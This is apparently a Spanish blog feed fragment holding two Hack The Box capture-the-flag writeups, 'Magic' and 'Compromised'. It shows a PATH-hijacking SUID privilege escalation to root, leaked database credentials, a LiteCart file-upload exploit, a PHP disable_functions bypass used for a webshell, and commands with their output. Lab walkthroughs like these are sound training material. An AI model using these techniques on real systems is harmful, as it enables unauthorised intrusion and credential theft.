/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `login`
--

DROP TABLE IF EXISTS `login`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `login` (
  `id` int(6) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `login`
--

LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
/*!40000 ALTER TABLE `login` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2023-06-13 15:00:33
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos unas credenciales correspondientes al usuario &lt;code&gt;theseus&lt;/code&gt;, ahora podemos migrar al usuario, dirigirnos al directorio del usuario y visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@ubuntu:/var/www/Magic$ su theseus
Password: 
theseus@ubuntu:/var/www/Magic$ whoami
theseus
theseus@ubuntu:/var/www/Magic$ cd /home/theseus/
theseus@ubuntu:~$ cat user.txt 
fb197a83208d0d99ecdbed4ee83fc4f0
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Listamos los archivos con privilegios &lt;code&gt;suid&lt;/code&gt;, vemos uno inusual &lt;code&gt;/bin/sysinfo&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;theseus@ubuntu:~$ find / -perm -4000 2&amp;gt;/dev/null | grep -v &quot;snap&quot;
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/arping
/usr/bin/vmware-user-suid-wrapper
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/bin/umount
/bin/fusermount
/bin/sysinfo
/bin/mount
/bin/su
/bin/ping
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si vemos los caracteres imprimibles del binario con la ayuda de &lt;code&gt;strings&lt;/code&gt;, podemos ver que hace uso del comando &lt;code&gt;fdisk&lt;/code&gt;, de manera relativa.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;theseus@ubuntu:~$ strings /bin/sysinfo
/lib64/ld-linux-x86-64.so.2
libstdc++.so.6
__gmon_start__
_ITM_deregisterTMCloneTable
====================Hardware Info====================
lshw -short
====================Disk Info====================
fdisk -l
====================CPU Info====================
cat /proc/cpuinfo
====================MEM Usage=====================
free -h
;*3$&quot;
zPLR
GCC: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
crtstuff.c
deregister_tm_clones
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo que haremos ahora sera efectuar un &lt;code&gt;path hijacking&lt;/code&gt;, donde alteraremos la ruta de nuestro &lt;code&gt;path&lt;/code&gt; y crearemos un archivo de nombre &lt;code&gt;fdisk&lt;/code&gt; donde le otorgaremos el privilegio &lt;code&gt;suid a la bash&lt;/code&gt;, de modo tal que al ejecutar &lt;code&gt;/bin/sysinfo&lt;/code&gt; hara uso del comando &lt;code&gt;fdisk&lt;/code&gt; y al haber manipulado nuestro &lt;code&gt;path&lt;/code&gt; lo hara desde la ruta actual que especifiquemos donde tendremos nuestro archivo creado, esto debido a que &lt;code&gt;fdisk&lt;/code&gt; no se esta aplicando de manera absoluta.&lt;/p&gt;

&lt;p&gt;Te dejo el siguiente articulo para que veas mas a fondo esta vulnerabilidad.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://deephacking.tech/path-hijacking-y-library-hijacking/#path-hijacking&quot;&gt;https://deephacking.tech/path-hijacking-y-library-hijacking/#path-hijacking&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Procedemos a crearnos el archivo en la ruta &lt;code&gt;/tmp&lt;/code&gt;, que generalamente es donde se tiene permiso de escritura y le damos permiso de ejecución.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;theseus@ubuntu:/tmp$ cat fdisk 
#!/bin/bash

chmod u+s /bin/bash
theseus@ubuntu:/tmp$ chmod +x fdisk
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora manilupalaremos nuestro &lt;code&gt;path&lt;/code&gt; para que este tire desde la ruta &lt;code&gt;/tmp&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;theseus@ubuntu:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
theseus@ubuntu:/tmp$ export PATH=/tmp:$PATH
theseus@ubuntu:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos el &lt;code&gt;/bin/sysinfo&lt;/code&gt; y vemos el privilegios de la &lt;code&gt;/bin/bash&lt;/code&gt; fue asignado correctamente.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;theseus@ubuntu:/tmp$ /bin/sysinfo
====================Hardware Info====================
H/W path           Device     Class      Description
====================================================
                              system     VMware Virtual Platform
/0                            bus        440BX Desktop Reference Platform

theseus@ubuntu:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora solo debemos ejecutar el comando &lt;code&gt;bash -p&lt;/code&gt; y estariamos como el usuario &lt;code&gt;root&lt;/code&gt;, seguidamente podemos dirigirnos al directorio del usuario &lt;code&gt;root&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;theseus@ubuntu:/tmp$ bash -p
bash-4.4# whoami
root
bash-4.4# cd /root
bash-4.4# cat root.txt 
a4f562d7949903aa1bf84994c94ce9e3
&lt;/code&gt;&lt;/pre&gt;

</description>
        <pubDate>Tue, 13 Jun 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Magic</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Magic</guid>
        
        <category>sql injection</category>
        
        <category>bypass upload file</category>
        
        <category>information leaked</category>
        
        <category>abusing mysql</category>
        
        <category>absusing suid</category>
        
        <category>path hijacking</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Compromised - htb writeup</title>
        <description>&lt;p&gt;Hoy vamos a resolver la máquina &lt;code&gt;Compromised&lt;/code&gt; de la plataforma de &lt;code&gt;hackthebox&lt;/code&gt; correspondiente a una &lt;code&gt;linux&lt;/code&gt; dificultad hard, la cual va a ser explotada , aprovechando información leakeada de credenciales y utilizando un exploit correspondiente a &lt;code&gt;litercart&lt;/code&gt; que conjunto al crearnos una función propia en &lt;code&gt;php&lt;/code&gt; que nos derive en la ejecución de comandos, despues aprovecharemos el concepto de &lt;code&gt;UDF&lt;/code&gt; en mysql, para poder ejecutar una función personalisada que nos permita ganar acceso al sistema, donde obtendremos credenciales validas de un archivo log y finalmente a partir del analisis de un &lt;code&gt;rootkit&lt;/code&gt; ganar tener acceso al sistema como el usuario privilegiado &lt;code&gt;rooot&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Compromissed
❯ ls
 Compromissed
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeración &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.207
PING 10.10.10.207 (10.10.10.207) 56(84) bytes of data.
64 bytes from 10.10.10.207: icmp_seq=1 ttl=63 time=207 ms

--- 10.10.10.207 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 206.547/206.547/206.547/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;allPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.207 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-13 15:35 GMT
Initiating SYN Stealth Scan at 15:35
Scanning 10.10.10.207 [65535 ports]
Discovered open port 80/tcp on 10.10.10.207
Discovered open port 22/tcp on 10.10.10.207
Completed SYN Stealth Scan at 15:35, 26.53s elapsed (65535 total ports)
Nmap scan report for 10.10.10.207
Host is up, received user-set (0.13s latency).
Scanned at 2023-06-13 15:35:29 GMT for 26s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.65 seconds
           Raw packets sent: 131087 (5.768MB) | Rcvd: 22 (968B)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Podemos ver que los puertos que se encuentran abiertos son el puerto &lt;code&gt;22 ssh&lt;/code&gt; y el &lt;code&gt;80 http&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,80 10.10.10.207 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-13 15:36 GMT
Nmap scan report for 10.10.10.207
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:da:5c:8e:8e:fb:8e:75:27:4a:b9:2a:59:cd:4b:cb (RSA)
|   256 d5:c5:b3:0d:c8:b6:69:e4:fb:13:a3:81:4a:15:16:d2 (ECDSA)
|_  256 35:6a:ee:af:dc:f8:5e:67:0d:bb:f3:ab:18:64:47:90 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-title: Legitimate Rubber Ducks | Online Store
|_Requested resource was http://10.10.10.207/shop/en/
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.60 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 7.6p1 Ubuntu 4ubuntu0.3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.4.29&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Seguidamente vamos a usar la herramienta &lt;code&gt;whatweb&lt;/code&gt; para ver por consola el gestor de contenido de la pagina web.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.207
http://10.10.10.207 [302 Found] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.207], RedirectLocation[/shop]
http://10.10.10.207/shop [301 Moved Permanently] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.207], RedirectLocation[http://10.10.10.207/shop/], Title[301 Moved Permanently]
http://10.10.10.207/shop/ [302 Found] Apache[2.4.29], Content-Language[en], Cookies[LCSESSID,cart[uid],currency_code,language_code], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.207], RedirectLocation[http://10.10.10.207/shop/en/], X-Powered-By[LiteCart]
http://10.10.10.207/shop/en/ [200 OK] Apache[2.4.29], Content-Language[en], Cookies[LCSESSID,cart[uid],currency_code,language_code], Country[RESERVED][ZZ], Email[admin@compromised.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.207], JQuery[3.3.1], Open-Graph-Protocol[website], PasswordField[password], Script, Title[Legitimate Rubber Ducks | Online Store], X-Powered-By[LiteCart]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La herramienta nos reporta bastante información la cual incluye rutas, usuaruos y dominios, vamos a proceder a abrir la web en el navegador. Vemos que el servicio corresponde a &lt;code&gt;Litecart&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;LiteCart es una plataforma de comercio electrónico gratuita fundada por el desarrollador web sueco T. Almroth. LiteCart está inspirado en lo mejor de los mundos y lo que podría haberse hecho mejor en soluciones alternativas de comercio electrónico.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Vamos a comenzar descubriendo rutas en la web, para ello primero usaremos unos de los scripts de nmap &lt;code&gt;http-enum&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ nmap --script http-enum -p80 10.10.10.207 -oN webScan
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-13 15:42 GMT
Nmap scan report for 10.10.10.207
Host is up (0.22s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /backup/: Backup folder w/ directory listing

Nmap done: 1 IP address (1 host up) scanned in 32.04 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Descubirmos una ruta valida que dentro tiene un archivo comprimido que procederemos a traer y descomprimir en nuestra maquina.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez lo descomprimimos en nuestra maquina, podemos ver un directorio de nombre &lt;code&gt;shop&lt;/code&gt; el cual incluye a su vez varios directorios y archivos, en los cuale&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cd shop
❯ ls
 admin   cache   data   ext   images   includes   logs   pages   vqmod   favicon.ico   index.php  ﮧ robots.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez dentro vamos a tratar de buscar credenciales, filtrando por archivos de configuración con la siguiente expresion:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ find . -name \*config\* | xargs cat | grep -iE &quot;user|pass|key&quot;
    'name' =&amp;gt; language::translate('title_users', 'Users'),
    'default' =&amp;gt; 'users',
      'users' =&amp;gt; 'users.inc.php',
      'edit_user' =&amp;gt; 'edit_user.inc.php',
    order by priority, `key`;&quot;
      'title' =&amp;gt; language::translate('settings_group:title_'.$group['key'], $group['name']),
      'doc' =&amp;gt; $group['key'],
    $app_config['docs'][$group['key']] = 'settings.inc.php';
      'icon' =&amp;gt; 'fa-user',
      'key' =&amp;gt; 'product_modal_window',
      'key' =&amp;gt; 'sidebar_parallax_effect',
      'key' =&amp;gt; 'compact_category_tree',
      'key' =&amp;gt; 'cookie_acceptance',
  define('DB_USERNAME', 'root');
  define('DB_PASSWORD', 'changethis');
  define('DB_TABLE_USERS',                             '`'. DB_DATABASE .'`.`'. DB_TABLE_PREFIX . 'users`');
 Password Encryption Salt
  define('PASSWORD_SALT', 'kg1T5n2bOEgF8tXIdMnmkcDUgDqOLVvACBuYGGpaFkOeMrFkK0BorssylqdAP48Fzbe8ylLUx626IWBGJ00ZQfOTgPnoxue1vnCN1amGRZHATcRXjoc6HiXw0uXYD9mI');
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos unas credenciales correspondientes a la base de datos &lt;code&gt;root: changethis&lt;/code&gt; que procederemos a almancenar.&lt;/p&gt;

&lt;p&gt;Ahora podemos ver qu dentro del directorio &lt;code&gt;admin&lt;/code&gt;, vemos un archivo de nombre &lt;code&gt;login.php&lt;/code&gt;, validamos si existe una ruta correspondiente en la web y efectivamente existe.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;despues al leer el archivo &lt;code&gt;login.php&lt;/code&gt;, podemos ver que comentada una ruta oculta con un archivo txt.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al validar la ruta obtenemos nuevas credenciales.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Validamos las credenciales y nos conectamos al servicio.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora vamos a buscar si existen vulnerabilidades asociadas a &lt;code&gt;litecart&lt;/code&gt; y vemos que existe un exploit en python2.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit litecart
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
LiteCart 2.1.2 - Arbitrary File Upload                                                                                                               | php/webapps/45267.py
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos traemos el exploit y lo ejecutamos con los parametros especificos&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 litecart.py -t http://10.10.10.207/shop/admin/ -u 'admin' -p 'theNextGenSt0r3!~'
Shell =&amp;gt; http://10.10.10.207/shop/admin/../vqmod/xml/D5B8I.php?c=id
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;validamos en la web el enlace generado pero vemos que no funciona, seguidamente vamos a modificar el exploit cambiando el nombre aleatorio que nis genera por uno estatico de nombre &lt;code&gt;shell.php&lt;/code&gt; y ejecutaremos dentro del arhivo &lt;code&gt;phpinfo()&lt;/code&gt; para ver las funciones que estan desabilitadas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Volvemos a ejecutar nuevamente el exploit.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 litecart.py -t http://10.10.10.207/shop/admin/ -u 'admin' -p 'theNextGenSt0r3!~'
Shell =&amp;gt; http://10.10.10.207/shop/admin/../vqmod/xml/shell.php
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos al enlace generado y vemos la lista funciones desabilitadas, y vemos que que por ello nuestro exploit no funciona ya que por defecto emplea la función &lt;code&gt;system&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que estamos muy limitados en cuanto a funciones, pero debemos recordar que podemos crear nuestra propia función que nos permita ejecutar comandos a nivel de sistema. Para ello existe una utilidad de la cual nos podemos apoyar.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://packetstormsecurity.com/files/154728/PHP-7.3-disable_functions-Bypass.html&quot;&gt;https://packetstormsecurity.com/files/154728/PHP-7.3-disable_functions-Bypass.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Para ello primero debemos crearnos un archivo con el contenido que nos proporcionan, en este casollamere al archivo &lt;code&gt;funct.php&lt;/code&gt;. Dentro lo que hace el codigo es crear una función con el nombre &lt;code&gt;pwn&lt;/code&gt;, pero puedes llamar a la función como quieras y tambien define un parametro el cual establecere con &lt;code&gt;$_REQUEST['cmd]&lt;/code&gt;, para que atravez de &lt;code&gt;cmd&lt;/code&gt; pueda ejecutar instrucciones.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora modificaremos el exploit &lt;code&gt;litercart&lt;/code&gt;, para que nos suba el contenido de la nueva función creada &lt;code&gt;funct.php&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ejecutamos el exploit, vamos al enlance y esta vez podemos ejecutar comandos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora si queremos mandarnos una revershell, vemos que no tenemos conexión.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para simular una &lt;code&gt;tty&lt;/code&gt; utilizaremos la herramienta &lt;code&gt;tty_over_http&lt;/code&gt; de s4vitar.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/s4vitar/ttyoverhttp&quot;&gt;https://github.com/s4vitar/ttyoverhttp&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;El uso es simple solo debemos ingresar la url de nuestra shell en la solicitud &lt;code&gt;requests&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De esta forma podemos movernos mas comodamente desde consola, adicionalemente vamos a otorgarnos un aconsola.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;❯ python3 tty_over_http.py
&amp;gt; whoami
&amp;gt; www-data
ls
&amp;gt; D5B8I.php
fmiracle.php
index.html
shell.php
python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
&amp;gt; www-data@compromised:/var/www/html/shop$
ls
&amp;gt; ls
admin  data  favicon.ico  includes   logs   robots.txt
cache  ext   images	 index.php  pages  vqmod
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Recordemos que anteriormente obtuvimos credenciales de la base de datos &lt;code&gt;root:changethis&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Validamos las credenciales y procedemos a enumerar la base de datos, enumerando la base de datos, encontramos un usuario y un hash, pero no conseguimos romper el hash.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;www-data@compromised:/var/www/html/shop$
 mysql -uroot -pchangethis -e &quot;select username, password from lc_users;&quot; ecom
&amp;lt; -e &quot;select username, password from lc_users;&quot; ecom
mysql: [Warning] Using a password on the command line interface can be insecure.
+----------+------------------------------------------------------------------+
| username | password                                                         |
+----------+------------------------------------------------------------------+
| admin    | 44c79f6669819c0185822c587597b46c98c3cff90512318cb84d8e7c190de8b4 |
+----------+------------------------------------------------------------------+
www-data@compromised:/var/www/html/shop$
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Al seguir enumerando el sistema, vemos que existe un usuario &lt;code&gt;mysql&lt;/code&gt;, el cual tiene asignada una bash.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;gt; cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
